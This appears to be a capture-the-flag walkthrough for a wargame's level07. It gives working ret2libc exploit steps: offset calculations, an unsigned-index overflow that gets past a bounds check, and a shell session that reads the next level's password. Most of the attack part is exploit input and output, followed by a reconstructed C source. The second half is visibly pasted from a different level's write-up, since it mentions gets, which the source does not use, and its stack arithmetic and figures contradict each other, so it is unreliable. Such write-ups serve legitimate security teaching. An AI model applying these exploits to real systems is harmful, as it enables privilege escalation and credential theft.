# ret2libc

Stack:
```
esp            0xffffd520       0xffffd520
ebp            0xffffd708       0xffffd708
```

esp - ebp:
```
Hex value:
708 – 520 = 1E8

Decimal value:
1800 – 1312 = 488
```

Padding:
```
488 - (0x24 aka buf)36 = 452
452 padding, +4 to reach return address aka 456 padding. Next 4 bytes are the return address.
```

Addresses:  
`0xf7e6aed0` system  
`0xf7f897ec` /bin/sh

Explaination:
```
456 padding, we're going to write in the int buffer, since it is a buffer of int, we're going to divide our padding by 4 for the index.
456 / 4 = 114
so we'll have the address of system at index 114 and the address of /bin/sh at index 116. (no exit cause whatever)

But we can't use the index 114 because it is divisible by 3, so we'll utilize the fact that this is unsigned int buffer to overflow the value to 114: 1073741938

So let's convert all the values:
index / number:
116 / 4160264172
1073741938 / 4159090384
```
Exploit:
```
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```

# Level07

## Answer
Our C source code generates the same assembly code as the original binary. Compile it as follows:
```
gcc -m32 -z execstack source.c
```

Let's take a look at the source code:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void clear_stdin()
{
    unsigned char var = 0; // -0x9(%ebp)
    while (1)
    {
        var = getchar();
        if (var == '\n' || var == 0xff)
            break;
    }
}

unsigned int get_unum()
{
    unsigned int var1 = 0; // -0xc(%ebp)

    fflush(stdout);
    scanf("%u", &var1);
    clear_stdin();
    return var1;
}

void prog_timeout()
{
    exit(1); // Supposed to be a system call but cannot reproduce
}

int read_number(int *buffer)
{
    unsigned int var = 0; // -0xc(%ebp)

    printf(" Index: ");
    var = get_unum();
    printf(" Number at data[%u] is %u\n",var, buffer[var]);
    return 0;
}

int store_number(int *buffer)
{
    unsigned int nbr = 0; // -0x10(%ebp)
    unsigned int idx = 0; // -0xc(%ebp)

    printf(" Number: ");
    nbr = get_unum();
    printf(" Index: ");
    idx = get_unum();
    if ((idx % 3 == 0) || (idx >> 0x18 == 0xb7)) // 0x18 is 24 and 0xb7 is 183
    {
        puts(" *** ERROR! ***");
        puts("   This index is reserved for wil!");
        puts(" *** ERROR! ***");
        return 1;
    }
    else
    {
        buffer[idx] = nbr;
        return 0;
    }
    return 0;
}

int main(int argc, char **argv, char **env)
{
    int ret = 0; // 0x1b4(%esp)
    char cmd[20] = {0}; // 0x1b8(%esp) - 0x1c8(%esp)
    unsigned int buff[100] = {0}; // 0x24(%esp)

    while (*argv)
    {
        memset(*argv, 0, strlen(*argv));
        *argv++;
    }
    while (*env)
    {
        memset(*env, 0, strlen(*env));
        *env++;
    }

    puts("----------------------------------------------------\n  Welcome to wil's crappy number storage service!   \n----------------------------------------------------\n Commands:                                          \n    store - store a number into the data storage    \n    read  - read a number from the data storage     \n    quit  - exit the program                        \n----------------------------------------------------\n   wil has reserved some storage :>                 \n----------------------------------");
    while (1)
    {
        printf("Input command");
        ret = 1;
        fgets(cmd, 20, stdin);
        cmd[strlen(cmd) - 1] = 0;

        if (strncmp(cmd, "store", 5) == 0)
            ret = store_number(buff);
        else if (strncmp(cmd, "read", 4) == 0)
            ret = read_number(buff);
        else if (strncmp(cmd, "quit", 4) == 0)
            break;

        if (ret)
            printf(" Completed %s command successfully\n", cmd);
        else
            printf(" Failed to do %s command\n", cmd);
        memset(cmd, 0, 20);
    }
    return 0;
}
```

Let's focus on the `main` function.  It reads input using the `gets` function, which is known to be unsafe due to its potential for causing buffer overflows, as it lacks a mechanism to limit the number of bytes read. This will allow us to overflow the buffer and overwrite the return address of the `main` function.

### Ret2Libc
Check the [level01's walkthrough](../level01/walkthrough.md#ret2libc) for an explanation of the ret2libc technique.

We, therefore, need the addresses of the `system`, `exit` functions and the string `/bin/sh` in memory. These are found using GDB:

```bash
# System
(gdb) info function system
0xf7e6aed0  system
[...]

# Exit
(gdb) info function exit
0xf7e5eb70  exit
[...]

# /bin/sh
(gdb) info proc mappings
[...]
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
[...]
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
0xf7f897ec
1 pattern found.
```

To find our padding, Let's analyze the stack layout of our program:
```bash
(gdb) set follow-fork-mode child # Follow the child process

(gdb) b *main+150 # Breaking after gets
Breakpoint 1 at 0x804875e

(gdb) b *main+168 # Breaking after wait
Breakpoint 2 at 0x8048770

(gdb) r # Run the program
Starting program: /home/users/level04/level04
[New process 2910]
Give me some shellcode, k
[Switching to process 2910]

Breakpoint 1, 0x0804875e in main ()

(gdb) info registers # Check esp and ebp addresses
[...]
esp            0xffffd650       0xffffd650
ebp            0xffffd708       0xffffd708
[...]
```

By calculating the difference between `esp` and `ebp` we can see that the stack is allocated 72 bytes:
```
0xbffff728 - 0xbffff6e0 = b8 (184 in decimal)
```	

Furthermore, we can see that our buffer is located at `0x20(%esp),%eax`. Since there is 184 bytes for the stack, our buffer will therefore require 152 bytes (184 - 32) before reaching `ebp`.

Since our goal is to overflow the stack until we reach the return address of the main function, we need to add another 4 bytes to go from `ebp` to `ebp + 4` (the return address). So a total of 156 bytes (152 + 4).

Anything written beyond those 156 bytes will be treated as an address (only the 4 next bytes) and jumped to by the `ret` instruction of the `main` function.

Alright, let's craft our payload:
```
reminder: padding + address of system + address of exit + address of "/bin/sh"

"\x90"*156 + "\xf7\xe6\xae\xd0" + "\xf7\xe5\xeb\x70" + "\xf7\xf8\x97\xec"
```

Let's run it:
```bash
level04@OverRide:~$ (python -c 'print("\x90"*156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1])' && echo cat /home/users/level05/.pass) | ./level04
Give me some shellcode, k
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

We are now level05! Let's move on to the next level.